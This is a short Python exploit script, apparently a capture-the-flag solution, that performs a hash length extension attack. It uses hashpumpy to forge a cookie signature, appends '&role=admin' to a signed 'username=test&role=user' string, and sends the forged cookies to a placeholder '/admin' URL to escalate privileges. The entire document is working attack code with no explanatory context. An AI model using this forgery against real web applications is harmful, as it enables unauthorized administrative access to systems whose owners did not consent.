exp

```python
#coding=utf-8
import urllib2

import hashpumpy
import requests

ha=hashpumpy.hashpump('5b8f99d780ec542da912a5a5cf2bc341','username=test&role=user','&role=admin',7)

# s=str(has[1])
auth=urllib2.quote(ha[1])
print(auth)
sig=ha[0]
print sig
cookie={'auth':auth,'sig':sig}
ret=requests.get("http://url/admin",cookies=cookie)
print ret.text



```




